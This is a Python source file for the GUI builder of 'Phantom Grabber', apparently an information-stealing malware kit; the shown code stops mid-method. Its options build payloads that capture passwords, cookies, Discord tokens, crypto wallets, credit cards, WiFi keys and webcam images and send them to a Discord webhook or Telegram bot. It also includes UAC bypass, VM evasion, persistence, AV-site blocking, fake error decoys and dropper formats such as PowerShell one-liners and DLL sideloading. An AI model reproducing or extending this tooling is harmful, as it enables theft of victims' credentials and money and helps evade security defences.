#!/usr/bin/env python3
"""
Phantom Grabber — GUI Builder
CustomTkinter dark-themed builder interface.
"""

import customtkinter as ctk
import json
import logging
import os
import platform
import subprocess
import sys
import threading
import uuid
import webbrowser
from tkinter import filedialog, messagebox
from typing import Any

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
logger = logging.getLogger("PhantomGUI")

class LogRedirector:
    """Redirects stdout/stderr stream writing to a logging framework with full stream compatibility."""
    def __init__(self, logger_obj, level=logging.INFO):
        self.logger = logger_obj
        self.level = level
        self.encoding = "utf-8"
        self.errors = "replace"

    def write(self, buf):
        if not buf:
            return
        if isinstance(buf, bytes):
            buf = buf.decode(self.encoding, errors=self.errors)
        for line in buf.rstrip().splitlines():
            self.logger.log(self.level, line.rstrip())

    def flush(self):
        pass

    def isatty(self):
        return False

class GuiLogHandler(logging.Handler):
    """Custom logging handler that invokes a thread-safe callback to append log text."""
    def __init__(self, append_func):
        super().__init__()
        self.append_func = append_func

    def emit(self, record):
        msg = self.format(record)
        self.append_func(msg + "\n")


# ─── Theme Constants ─────────────────────────────────────────────────────────
COLOR_BG_DARK = "#1a1a2e"
COLOR_BG_FRAME = "#16213e"
COLOR_BUTTON = "#393646"
COLOR_BUTTON_HOVER = "#6D5D6E"
COLOR_TITLE = "#2F58CD"
COLOR_BUILD_GREEN = "#1E5128"
COLOR_BUILD_GREEN_HOVER = "#4E9F3D"
COLOR_ACCENT = "#e94560"
COLOR_ENTRY_BG = "#0f3460"
COLOR_TEXT = "#e0e0e0"
COLOR_TEXT_DIM = "#888888"
COLOR_DANGER = "#c0392b"
COLOR_SUCCESS = "#27ae60"
COLOR_WARNING = "#f39c12"

FONT_FAMILY = "Consolas"
FONT_SIZE = 14
FONT_SIZE_SMALL = 12
FONT_SIZE_TITLE = 22

WINDOW_WIDTH = 1300
WINDOW_HEIGHT = 750

ICON_MAP = {"Error": 0, "Question": 1, "Warning": 2, "Info": 3}
ICON_MAP_REVERSE = {v: k for k, v in ICON_MAP.items()}
CONSOLE_MODES = ["None", "Force", "Debug"]
CONSOLE_MODE_MAP = {"None": 0, "Force": 1, "Debug": 2}

BANNER_ASCII = r"""
 ____  _   _    _    _   _ _____ ___  __  __
|  _ \| | | |  / \  | \ | |_   _/ _ \|  \/  |
| |_) | |_| | / _ \ |  \| | | || | | | |\/| |
|  __/|  _  |/ ___ \| |\  | | || |_| | |  | |
|_|   |_| |_/_/   \_\_| \_| |_| \___/|_|  |_|
         G R A B B E R   [ 2 0 2 6 ]
"""


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITY CLASS
# ═════════════════════════════════════════════════════════════════════════════
class Utility:
    """Static helper methods for environment checks."""

    @staticmethod
    def CheckConfiguration() -> bool:
        """Check if Components directory and config.json exist."""
        components_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Components")
        config_path = os.path.join(components_dir, "config.json")
        if not os.path.isdir(components_dir):
            messagebox.showerror("Error", "Components directory not found!")
            return False
        if not os.path.isfile(config_path):
            logger.warning("config.json not found, will create on build.")
        return True

    @staticmethod
    def CheckForUpdates() -> str | None:
        """Check the Extras/hash file for version info."""
        hash_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Extras", "hash")
        if os.path.isfile(hash_path):
            with open(hash_path, "r", encoding="utf-8") as f:
                return f.read().strip()
        return None

    @staticmethod
    def IsAdmin() -> bool:
        """Check if running with administrator privileges."""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False

    @staticmethod
    def ToggleConsole(show: bool) -> None:
        """Show or hide the console window."""
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 1 if show else 0)
        except Exception:
            pass

    @staticmethod
    def CheckInternetConnection() -> bool:
        """Quick connectivity check."""
        try:
            import urllib.request
            urllib.request.urlopen("https://httpbin.org/get", timeout=5)
            return True
        except Exception:
            return False

    @staticmethod
    def TestWebhook(url: str) -> bool:
        """Test a Discord webhook URL by sending a GET request and a test message."""
        try:
            import urllib.request
            import json
            
            # Send a test message
            data = json.dumps({"content": "Working!"}).encode("utf-8")
            req = urllib.request.Request(url, data=data, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Content-Type': 'application/json'}, method="POST")
            resp = urllib.request.urlopen(req, timeout=10)
            return resp.status in (200, 204)
        except Exception:
            return False

    @staticmethod
    def TestTelegram(endpoint: str) -> bool:
        """Test a Telegram bot endpoint (TOKEN$CHATID format)."""
        try:
            if "$" not in endpoint:
                return False
            token, chat_id = endpoint.split("$", 1)
            import urllib.request
            url = f"https://api.telegram.org/bot{token}/getMe"
            resp = urllib.request.urlopen(url, timeout=10)
            data = json.loads(resp.read().decode())
            return data.get("ok", False)
        except Exception:
            return False

    @staticmethod
    def ElevateAdmin() -> None:
        """Relaunch with admin privileges via UAC prompt."""
        try:
            import ctypes
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except Exception:
            pass


# ═════════════════════════════════════════════════════════════════════════════
#  FAKE ERROR POPUP
# ═════════════════════════════════════════════════════════════════════════════
class FakeErrorPopup(ctk.CTkToplevel):
    """Popup window to configure fake error dialog settings."""

    def __init__(self, master: Any, callback: Any, current_values: tuple[str, str, int] | None = None):
        super().__init__(master)
        self.callback = callback
        self.title("Fake Error Configuration")
        self.geometry("420x300")
        self.resizable(False, False)
        self.configure(fg_color=COLOR_BG_DARK)
        self.grab_set()
        self.focus_force()

        title_val = current_values[0] if current_values else "Error"
        msg_val = current_values[1] if current_values else "An error occurred."
        icon_val = current_values[2] if current_values else 0

        font_main = ctk.CTkFont(family=FONT_FAMILY, size=FONT_SIZE)
        font_small = ctk.CTkFont(family=FONT_FAMILY, size=FONT_SIZE_SMALL)

        # Title
        ctk.CTkLabel(self, text="Fake Error Settings", font=ctk.CTkFont(family=FONT_FAMILY, size=18, weight="bold"),
                      text_color=COLOR_ACCENT).pack(pady=(15, 10))

        # Error Title
        frame_title = ctk.CTkFrame(self, fg_color="transparent")
        frame_title.pack(fill="x", padx=20, pady=5)
        ctk.CTkLabel(frame_title, text="Title:", font=font_main, text_color=COLOR_TEXT, width=80, anchor="w").pack(side="left")
        self.title_entry = ctk.CTkEntry(frame_title, font=font_small, fg_color=COLOR_ENTRY_BG,
                                         text_color=COLOR_TEXT, border_width=0, width=280)
        self.title_entry.pack(side="left", padx=(5, 0))
        self.title_entry.insert(0, title_val)

        # Error Message
        frame_msg = ctk.CTkFrame(self, fg_color="transparent")
        frame_msg.pack(fill="x", padx=20, pady=5)
        ctk.CTkLabel(frame_msg, text="Message:", font=font_main, text_color=COLOR_TEXT, width=80, anchor="w").pack(side="left")
        self.message_entry = ctk.CTkEntry(frame_msg, font=font_small, fg_color=COLOR_ENTRY_BG,
                                           text_color=COLOR_TEXT, border_width=0, width=280)
        self.message_entry.pack(side="left", padx=(5, 0))
        self.message_entry.insert(0, msg_val)

        # Icon Type
        frame_icon = ctk.CTkFrame(self, fg_color="transparent")
        frame_icon.pack(fill="x", padx=20, pady=5)
        ctk.CTkLabel(frame_icon, text="Icon:", font=font_main, text_color=COLOR_TEXT, width=80, anchor="w").pack(side="left")
        self.icon_var = ctk.StringVar(value=ICON_MAP_REVERSE.get(icon_val, "Error"))
        self.icon_dropdown = ctk.CTkOptionMenu(
            frame_icon, variable=self.icon_var, values=list(ICON_MAP.keys()),
            font=font_small, fg_color=COLOR_BUTTON, button_color=COLOR_BUTTON_HOVER,
            button_hover_color=COLOR_ACCENT, dropdown_fg_color=COLOR_BG_FRAME, width=280
        )
        self.icon_dropdown.pack(side="left", padx=(5, 0))

        # Buttons
        btn_frame = ctk.CTkFrame(self, fg_color="transparent")
        btn_frame.pack(pady=20)
        ctk.CTkButton(btn_frame, text="Apply", font=font_main, fg_color=COLOR_SUCCESS,
                       hover_color=COLOR_BUILD_GREEN_HOVER, width=120, command=self._on_apply).pack(side="left", padx=10)
        ctk.CTkButton(btn_frame, text="Cancel", font=font_main, fg_color=COLOR_DANGER,
                       hover_color="#e74c3c", width=120, command=self.destroy).pack(side="left", padx=10)

    def _on_apply(self) -> None:
        title = self.title_entry.get().strip()
        message = self.message_entry.get().strip()
        icon_idx = ICON_MAP.get(self.icon_var.get(), 0)
        if not title:
            messagebox.showwarning("Warning", "Title cannot be empty.", parent=self)
            return
        if not message:
            messagebox.showwarning("Warning", "Message cannot be empty.", parent=self)
            return
        self.callback(title, message, icon_idx)
        self.destroy()


# ═════════════════════════════════════════════════════════════════════════════
#  OPTIONS FRAME
# ═════════════════════════════════════════════════════════════════════════════
class BuilderOptionsFrame(ctk.CTkScrollableFrame):
    """Scrollable options panel with all module checkboxes and settings."""

    def __init__(self, master: Any, **kwargs: Any):
        super().__init__(master, fg_color=COLOR_BG_FRAME, corner_radius=10,
                         scrollbar_button_color=COLOR_BUTTON, scrollbar_button_hover_color=COLOR_ACCENT,
                         **kwargs)

        self.font_main = ctk.CTkFont(family=FONT_FAMILY, size=FONT_SIZE)
        self.font_small = ctk.CTkFont(family=FONT_FAMILY, size=FONT_SIZE_SMALL)
        self.font_header = ctk.CTkFont(family=FONT_FAMILY, size=16, weight="bold")

        # ── Module Checkboxes ────────────────────────────────────────────
        self._create_section_header("Collection Modules")

        checkbox_frame = ctk.CTkFrame(self, fg_color="transparent")
        checkbox_frame.pack(fill="x", padx=10, pady=5)
        checkbox_frame.columnconfigure((0, 1, 2), weight=1)

        # Column 1
        self.capturePasswordsVar = ctk.BooleanVar(value=True)
        self.captureCookiesVar = ctk.BooleanVar(value=True)
        self.captureHistoryVar = ctk.BooleanVar(value=True)
        self.captureAutofillsVar = ctk.BooleanVar(value=True)
        self.captureDiscordTokensVar = ctk.BooleanVar(value=True)
        self.captureGamesVar = ctk.BooleanVar(value=True)

        col1_checks = [
            ("Capture Passwords", self.capturePasswordsVar),
            ("Capture Cookies", self.captureCookiesVar),
            ("Capture History", self.captureHistoryVar),
            ("Capture Autofills", self.captureAutofillsVar),
            ("Capture Discord Tokens", self.captureDiscordTokensVar),
            ("Capture Games", self.captureGamesVar),
        ]
        for i, (text, var) in enumerate(col1_checks):
            self._create_checkbox(checkbox_frame, text, var, row=i, col=0)

        # Column 2
        self.captureWalletsVar = ctk.BooleanVar(value=True)
        self.captureWifiVar = ctk.BooleanVar(value=True)
        self.captureSystemInfoVar = ctk.BooleanVar(value=True)
        self.captureScreenshotVar = ctk.BooleanVar(value=True)
        self.captureWebcamVar = ctk.BooleanVar(value=True)
        self.captureTelegramVar = ctk.BooleanVar(value=True)

        col2_checks = [
            ("Capture Wallets", self.captureWalletsVar),
            ("Capture WiFi Passwords", self.captureWifiVar),
            ("Capture System Info", self.captureSystemInfoVar),
            ("Capture Screenshot", self.captureScreenshotVar),
            ("Capture Webcam", self.captureWebcamVar),
            ("Capture Telegram Session", self.captureTelegramVar),
        ]
        for i, (text, var) in enumerate(col2_checks):
            self._create_checkbox(checkbox_frame, text, var, row=i, col=1)

        # Column 3
        self.captureCommonFilesVar = ctk.BooleanVar(value=True)
        self.captureExifVar = ctk.BooleanVar(value=True)
        self.captureCreditCardsVar = ctk.BooleanVar(value=True)
        self.blockAvVar = ctk.BooleanVar(value=True)
        self.discordInjectionVar = ctk.BooleanVar(value=True)
        self.pingVar = ctk.BooleanVar(value=True)

        col3_checks = [
            ("Capture Common Files", self.captureCommonFilesVar),
            ("Capture EXIF Data", self.captureExifVar),
            ("Capture Credit Cards", self.captureCreditCardsVar),
            ("Block AV Sites", self.blockAvVar),
            ("Discord Injection", self.discordInjectionVar),
            ("Ping Me", self.pingVar),
        ]
        for i, (text, var) in enumerate(col3_checks):
            self._create_checkbox(checkbox_frame, text, var, row=i, col=2)

        # ── Persistence / Protection ─────────────────────────────────────
        self._create_section_header("Persistence & Protection")

        settings_frame = ctk.CTkFrame(self, fg_color="transparent")
        settings_frame.pack(fill="x", padx=10, pady=5)
        settings_frame.columnconfigure((0, 1, 2, 3), weight=1)

        self.startupVar = ctk.BooleanVar(value=True)
        self.meltVar = ctk.BooleanVar(value=False)
        self.uacBypassVar = ctk.BooleanVar(value=True)
        self.vmProtectVar = ctk.BooleanVar(value=True)

        self._create_checkbox(settings_frame, "Startup", self.startupVar, row=0, col=0)
        self._create_checkbox(settings_frame, "Melt", self.meltVar, row=0, col=1)
        self._create_checkbox(settings_frame, "UAC Bypass", self.uacBypassVar, row=0, col=2)
        self._create_checkbox(settings_frame, "VM Protect", self.vmProtectVar, row=0, col=3)

        # ── Archive Password ──────────────────────────────────────────────
        self._create_section_header("Archive Password")
        pw_frame = ctk.CTkFrame(self, fg_color="transparent")
        pw_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(pw_frame, text="Password:", font=self.font_main, text_color=COLOR_TEXT).pack(side="left")
        self.password_entry = ctk.CTkEntry(pw_frame, font=self.font_small, fg_color=COLOR_ENTRY_BG,
                                            text_color=COLOR_TEXT, border_width=0, width=200,
                                            placeholder_text="phantom")
        self.password_entry.pack(side="left", padx=(10, 0))
        self.password_entry.insert(0, "phantom")

        # ── Pump Stub Size ────────────────────────────────────────────────
        pump_frame = ctk.CTkFrame(self, fg_color="transparent")
        pump_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(pump_frame, text="Pump Size (MB):", font=self.font_main, text_color=COLOR_TEXT).pack(side="left")
        self.pump_entry = ctk.CTkEntry(pump_frame, font=self.font_small, fg_color=COLOR_ENTRY_BG,
                                        text_color=COLOR_TEXT, border_width=0, width=80,
                                        placeholder_text="0")
        self.pump_entry.pack(side="left", padx=(10, 0))
        self.pump_entry.insert(0, "0")

        # ── Select All / Deselect All ────────────────────────────────────
        toggle_frame = ctk.CTkFrame(self, fg_color="transparent")
        toggle_frame.pack(fill="x", padx=10, pady=(10, 5))
        ctk.CTkButton(toggle_frame, text="Select All Modules", font=self.font_small,
                       fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER, width=150,
                       command=self._select_all).pack(side="left", padx=5)
        ctk.CTkButton(toggle_frame, text="Deselect All Modules", font=self.font_small,
                       fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER, width=150,
                       command=self._deselect_all).pack(side="left", padx=5)

    def _create_section_header(self, text: str) -> None:
        ctk.CTkLabel(self, text=text, font=self.font_header, text_color=COLOR_ACCENT,
                      anchor="w").pack(fill="x", padx=10, pady=(15, 5))
        ctk.CTkFrame(self, fg_color=COLOR_ACCENT, height=1).pack(fill="x", padx=10, pady=(0, 5))

    def _create_checkbox(self, parent: ctk.CTkFrame, text: str, variable: ctk.BooleanVar,
                          row: int, col: int) -> ctk.CTkCheckBox:
        cb = ctk.CTkCheckBox(
            parent, text=text, variable=variable,
            font=ctk.CTkFont(family=FONT_FAMILY, size=FONT_SIZE_SMALL),
            text_color=COLOR_TEXT, fg_color=COLOR_ACCENT,
            hover_color=COLOR_BUTTON_HOVER, border_color=COLOR_TEXT_DIM,
            checkmark_color=COLOR_BG_DARK, corner_radius=4
        )
        cb.grid(row=row, column=col, sticky="w", padx=10, pady=4)
        return cb

    def _get_all_module_vars(self) -> list[ctk.BooleanVar]:
        return [
            self.capturePasswordsVar, self.captureCookiesVar, self.captureHistoryVar,
            self.captureAutofillsVar, self.captureDiscordTokensVar, self.captureGamesVar,
            self.captureWalletsVar, self.captureWifiVar, self.captureSystemInfoVar,
            self.captureScreenshotVar, self.captureWebcamVar, self.captureTelegramVar,
            self.captureCommonFilesVar, self.captureExifVar, self.captureCreditCardsVar,
            self.blockAvVar, self.discordInjectionVar, self.pingVar,
        ]

    def _select_all(self) -> None:
        for var in self._get_all_module_vars():
            var.set(True)

    def _deselect_all(self) -> None:
        for var in self._get_all_module_vars():
            var.set(False)

    def get_pump_size(self) -> int:
        try:
            return max(0, int(self.pump_entry.get()))
        except (ValueError, TypeError):
            return 0

    def get_password(self) -> str:
        pw = self.password_entry.get().strip()
        return pw if pw else "phantom"


# ═════════════════════════════════════════════════════════════════════════════
#  MAIN BUILDER WINDOW
# ═════════════════════════════════════════════════════════════════════════════
class Builder(ctk.CTk):
    """Main Phantom Grabber builder window."""

    def __init__(self) -> None:
        super().__init__()

        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        self.title("Phantom Grabber [Builder]")
        self.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
        self.resizable(False, False)
        self.configure(fg_color=COLOR_BG_DARK)

        self.font_main = ctk.CTkFont(family=FONT_FAMILY, size=FONT_SIZE)
        self.font_small = ctk.CTkFont(family=FONT_FAMILY, size=FONT_SIZE_SMALL)
        self.font_title = ctk.CTkFont(family=FONT_FAMILY, size=FONT_SIZE_TITLE, weight="bold")
        self.font_banner = ctk.CTkFont(family=FONT_FAMILY, size=10)

        # State
        self.c2_mode: int = 0  # 0 = Discord, 1 = Telegram
        self.output_mode: str = "exe"  # "exe" or "py"
        self.console_mode_index: int = 0  # 0=None, 1=Force, 2=Debug
        self.bind_path: str | None = None
        self.icon_path: str | None = None
        self.fake_error_enabled: bool = False
        self.fake_error_config: tuple[str, str, int] = ("Error", "An error occurred.", 0)
        self.is_building: bool = False
        self.delivery_method: str = "exe"  # exe, image, powershell, bat, vbs, hta, lnk, sfx, dll, dll_sideload, all
        self.decoy_image_path: str | None = None
        self.hosted_url_value: str = ""
        self.dll_name_value: str = ""
        self.sideload_target_path: str | None = None

        self._build_ui()
        self._update_c2_placeholder()

        # Connect logging to textbox
        gui_handler = GuiLogHandler(self.log_to_textbox)
        gui_handler.setFormatter(logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
        logging.getLogger().addHandler(gui_handler)

        # Version check
        version_hash = Utility.CheckForUpdates()
        if version_hash:
            logger.info(f"Build hash: {version_hash}")

    def _build_ui(self) -> None:
        """Construct the entire GUI layout."""

        # ── Title Bar ────────────────────────────────────────────────────
        title_frame = ctk.CTkFrame(self, fg_color=COLOR_BG_FRAME, corner_radius=0, height=60)
        title_frame.pack(fill="x", padx=0, pady=0)
        title_frame.pack_propagate(False)

        ctk.CTkLabel(
            title_frame, text="⚡ PHANTOM GRABBER", font=self.font_title,
            text_color=COLOR_TITLE
        ).pack(side="left", padx=20, pady=10)

        ctk.CTkLabel(
            title_frame, text="[ 2026 Edition ]", font=self.font_small,
            text_color=COLOR_TEXT_DIM
        ).pack(side="left", padx=5, pady=10)

        # Admin badge
        if Utility.IsAdmin():
            ctk.CTkLabel(
                title_frame, text="★ ADMIN", font=self.font_small,
                text_color=COLOR_SUCCESS
            ).pack(side="right", padx=20, pady=10)
        else:
            ctk.CTkLabel(
                title_frame, text="☆ USER", font=self.font_small,
                text_color=COLOR_WARNING
            ).pack(side="right", padx=20, pady=10)

        # ── C2 Configuration ────────────────────────────────────────────
        c2_frame = ctk.CTkFrame(self, fg_color=COLOR_BG_FRAME, corner_radius=10, height=80)
        c2_frame.pack(fill="x", padx=15, pady=(10, 5))
        c2_frame.pack_propagate(False)

        c2_left = ctk.CTkFrame(c2_frame, fg_color="transparent")
        c2_left.pack(side="left", fill="both", expand=True, padx=10, pady=10)

        self.c2_label = ctk.CTkLabel(c2_left, text="Discord Webhook:", font=self.font_main,
                                      text_color=COLOR_TEXT, anchor="w")
        self.c2_label.pack(anchor="w")

        self.c2_entry = ctk.CTkEntry(
            c2_left, font=self.font_small, fg_color=COLOR_ENTRY_BG,
            text_color=COLOR_TEXT, border_width=0, height=35,
            placeholder_text="https://discord.com/api/webhooks/..."
        )
        self.c2_entry.pack(fill="x", pady=(5, 0))

        c2_right = ctk.CTkFrame(c2_frame, fg_color="transparent", width=320)
        c2_right.pack(side="right", padx=10, pady=10)
        c2_right.pack_propagate(False)

        self.c2_mode_btn = ctk.CTkButton(
            c2_right, text="Mode: Discord", font=self.font_small,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=140, command=self._toggle_c2_mode
        )
        self.c2_mode_btn.pack(side="left", padx=5)

        self.test_btn = ctk.CTkButton(
            c2_right, text="Test", font=self.font_small,
            fg_color="#2980b9", hover_color="#3498db",
            width=80, command=self._test_endpoint
        )
        self.test_btn.pack(side="left", padx=5)

        # ── Main Content Area ────────────────────────────────────────────
        content_frame = ctk.CTkFrame(self, fg_color="transparent")
        content_frame.pack(fill="both", expand=True, padx=15, pady=5)

        # Tabview for Builder vs Console Logs
        self.tabview = ctk.CTkTabview(content_frame)
        self.tabview.pack(fill="both", expand=True)

        tab_builder = self.tabview.add("Builder Options")
        tab_console = self.tabview.add("Build Console")

        # Configure tabs layout
        tab_builder.grid_columnconfigure(0, weight=1)
        tab_builder.grid_rowconfigure(0, weight=1)

        tab_console.grid_columnconfigure(0, weight=1)
        tab_console.grid_rowconfigure(0, weight=1)

        # ── Tab 1: Builder Options Layout ────────────────────────────────
        builder_layout = ctk.CTkFrame(tab_builder, fg_color="transparent")
        builder_layout.pack(fill="both", expand=True)

        # Left: Options scrollable frame
        self.options_frame = BuilderOptionsFrame(builder_layout, width=850, height=400)
        self.options_frame.pack(side="left", fill="both", expand=True, padx=(0, 10))

        # Right: Action buttons panel (scrollable to fit all screen sizes)
        right_panel = ctk.CTkScrollableFrame(
            builder_layout, fg_color=COLOR_BG_FRAME, corner_radius=10, width=320,
            scrollbar_button_color=COLOR_BUTTON, scrollbar_button_hover_color=COLOR_ACCENT
        )
        right_panel.pack(side="right", fill="both", expand=True)

        ctk.CTkLabel(right_panel, text="Build Options", font=ctk.CTkFont(family=FONT_FAMILY, size=16, weight="bold"),
                      text_color=COLOR_ACCENT).pack(pady=(15, 10))

        # Output mode toggle
        self.output_btn = ctk.CTkButton(
            right_panel, text="Output: EXE\n(Standard Compiled Executable)", font=self.font_main,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=280, height=45, command=self._toggle_output_mode
        )
        self.output_btn.pack(pady=5, padx=20)

        # Console mode toggle
        self.console_btn = ctk.CTkButton(
            right_panel, text="Console: None\n(Hidden from victim)", font=self.font_main,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=280, height=45, command=self._toggle_console_mode
        )
        self.console_btn.pack(pady=5, padx=20)

        # Bind executable
        self.bind_btn = ctk.CTkButton(
            right_panel, text="Bind Executable: None\n(Run another EXE alongside payload)", font=self.font_main,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=280, height=45, command=self._select_bind
        )
        self.bind_btn.pack(pady=5, padx=20)

        # Select icon
        self.icon_btn = ctk.CTkButton(
            right_panel, text="Icon: Default\n(Custom icon for payload)", font=self.font_main,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=280, height=45, command=self._select_icon
        )
        self.icon_btn.pack(pady=5, padx=20)

        # Fake error
        self.fake_error_btn = ctk.CTkButton(
            right_panel, text="Fake Error: OFF\n(Shows fake error on start)", font=self.font_main,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=280, height=45, command=self._configure_fake_error
        )
        self.fake_error_btn.pack(pady=5, padx=20)

        # ── Delivery Method ──────────────────────────────────────────────
        ctk.CTkFrame(right_panel, fg_color=COLOR_ACCENT, height=1).pack(fill="x", padx=20, pady=(10, 2))
        ctk.CTkLabel(right_panel, text="Delivery Method",
                      font=ctk.CTkFont(family=FONT_FAMILY, size=13, weight="bold"),
                      text_color=COLOR_ACCENT).pack(pady=(2, 4))

        DELIVERY_CHOICES = [
            "Standard EXE", "Image Disguise", "PowerShell One-Liner",
            "BAT Dropper", "VBS Dropper", "HTA File",
            "LNK Shortcut", "Self-Extracting ZIP",
            "DLL Create", "DLL Sideload (Proxy)",
            "All Methods",
        ]
        self._delivery_display_to_key = {
            "Standard EXE": "exe", "Image Disguise": "image",
            "PowerShell One-Liner": "powershell", "BAT Dropper": "bat",
            "VBS Dropper": "vbs", "HTA File": "hta",
            "LNK Shortcut": "lnk", "Self-Extracting ZIP": "sfx",
            "DLL Create": "dll", "DLL Sideload (Proxy)": "dll_sideload",
            "All Methods": "all",
        }
        self.delivery_var = ctk.StringVar(value="Standard EXE")
        self.delivery_dropdown = ctk.CTkOptionMenu(
            right_panel, variable=self.delivery_var, values=DELIVERY_CHOICES,
            font=self.font_small, fg_color=COLOR_BUTTON,
            button_color=COLOR_BUTTON_HOVER, button_hover_color=COLOR_ACCENT,
            dropdown_fg_color=COLOR_BG_FRAME, width=280,
            command=self._on_delivery_changed,
        )
        self.delivery_dropdown.pack(pady=3, padx=20)

        # Decoy image (shown for Image Disguise)
        self.decoy_btn = ctk.CTkButton(
            right_panel, text="Select Decoy Image", font=self.font_small,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=280, height=30, command=self._select_decoy_image,
        )
        # Hosted URL (shown for PowerShell / LNK)
        self.hosted_url_frame = ctk.CTkFrame(right_panel, fg_color="transparent")
        ctk.CTkLabel(self.hosted_url_frame, text="Hosted URL (optional):",
                      font=self.font_small, text_color=COLOR_TEXT_DIM).pack(anchor="w")
        self.hosted_url_entry = ctk.CTkEntry(
            self.hosted_url_frame, font=self.font_small, fg_color=COLOR_ENTRY_BG,
            text_color=COLOR_TEXT, border_width=0, height=28, width=260,
            placeholder_text="https://your-server.com/payload.exe",
        )
        self.hosted_url_entry.pack(fill="x")

        # DLL name entry (shown for DLL modes)
        self.dll_name_frame = ctk.CTkFrame(right_panel, fg_color="transparent")
        ctk.CTkLabel(self.dll_name_frame, text="DLL Name (e.g. version.dll):",
                      font=self.font_small, text_color=COLOR_TEXT_DIM).pack(anchor="w")
        self.dll_name_entry = ctk.CTkEntry(
            self.dll_name_frame, font=self.font_small, fg_color=COLOR_ENTRY_BG,
            text_color=COLOR_TEXT, border_width=0, height=28, width=260,
            placeholder_text="version.dll",
        )
        self.dll_name_entry.pack(fill="x")

        # Sideload target DLL picker (shown for DLL Sideload)
        self.sideload_btn = ctk.CTkButton(
            right_panel, text="Target DLL: preset (version.dll)", font=self.font_small,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=280, height=30, command=self._select_sideload_target,
        )
        # (all delivery extras hidden by default)

        # Mutex
        mutex_frame = ctk.CTkFrame(right_panel, fg_color="transparent")
        mutex_frame.pack(fill="x", padx=20, pady=(10, 5))
        ctk.CTkLabel(mutex_frame, text="Mutex:", font=self.font_small, text_color=COLOR_TEXT).pack(anchor="w")
        self.mutex_entry = ctk.CTkEntry(
            mutex_frame, font=self.font_small, fg_color=COLOR_ENTRY_BG,
            text_color=COLOR_TEXT, border_width=0, height=30,
            placeholder_text="auto-generated"
        )
        self.mutex_entry.pack(fill="x", pady=(3, 0))

        # Randomize mutex button
        ctk.CTkButton(
            right_panel, text="🎲 Randomize Mutex", font=self.font_small,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=280, height=28, command=self._randomize_mutex
        ).pack(pady=3, padx=20)

        # Spacer
        ctk.CTkFrame(right_panel, fg_color="transparent", height=10).pack()

        # ── BUILD BUTTON ─────────────────────────────────────────────────
        self.build_btn = ctk.CTkButton(
            right_panel, text="⚡ BUILD", font=ctk.CTkFont(family=FONT_FAMILY, size=18, weight="bold"),
            fg_color=COLOR_BUILD_GREEN, hover_color=COLOR_BUILD_GREEN_HOVER,
            width=280, height=50, command=self._on_build
        )
        self.build_btn.pack(pady=(10, 10), padx=20)

        # ── Tab 2: Build Console Layout ──────────────────────────────────
        log_frame = ctk.CTkFrame(tab_console, fg_color=COLOR_BG_FRAME, corner_radius=10)
        log_frame.pack(fill="both", expand=True, padx=5, pady=5)

        log_header = ctk.CTkFrame(log_frame, fg_color="transparent", height=30)
        log_header.pack(fill="x", padx=10, pady=(5, 2))
        log_header.pack_propagate(False)

        ctk.CTkLabel(
            log_header, text="LIVE BUILD LOGGER", font=ctk.CTkFont(family=FONT_FAMILY, size=13, weight="bold"),
            text_color=COLOR_ACCENT
        ).pack(side="left")

        ctk.CTkButton(
            log_header, text="💾 Save Log", font=self.font_small,
            fg_color=COLOR_BUTTON, hover_color=COLOR_BUTTON_HOVER,
            width=80, height=20, command=self._save_log_file
        ).pack(side="right")

        self.log_textbox = ctk.CTkTextbox(
            log_frame, font=ctk.CTkFont(family="Consolas", size=11),
            fg_color="#0b0b16", text_color="#00ffcc",
            border_width=0, corner_radius=5
        )
        self.log_textbox.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        self.log_textbox.configure(state="disabled")

        # ── Status Bar ──────────────────────────────────────────────────
        status_frame = ctk.CTkFrame(self, fg_color=COLOR_BG_FRAME, corner_radius=0, height=30)
        status_frame.pack(fill="x", side="bottom")
        status_frame.pack_propagate(False)

        self.status_label = ctk.CTkLabel(
            status_frame, text="Ready", font=self.font_small,
            text_color=COLOR_TEXT_DIM, anchor="w"
        )
        self.status_label.pack(side="left", padx=15, pady=3)

        self.progress_bar = ctk.CTkProgressBar(
            status_frame, fg_color=COLOR_BG_DARK, progress_color=COLOR_ACCENT,
            width=200, height=12
        )
        self.progress_bar.pack(side="right", padx=15, pady=8)
        self.progress_bar.set(0)

    # ── C2 Mode ──────────────────────────────────────────────────────────
    def _toggle_c2_mode(self) -> None:
        self.c2_mode = 1 - self.c2_mode
        self.c2_entry.delete(0, "end")
        self._update_c2_placeholder()
        self._update_discord_only_controls()

    def _update_c2_placeholder(self) -> None:
        if self.c2_mode == 0:
            self.c2_mode_btn.configure(text="Mode: Discord")
            self.c2_label.configure(text="Discord Webhook:")
            self.c2_entry.configure(placeholder_text="https://discord.com/api/webhooks/...")
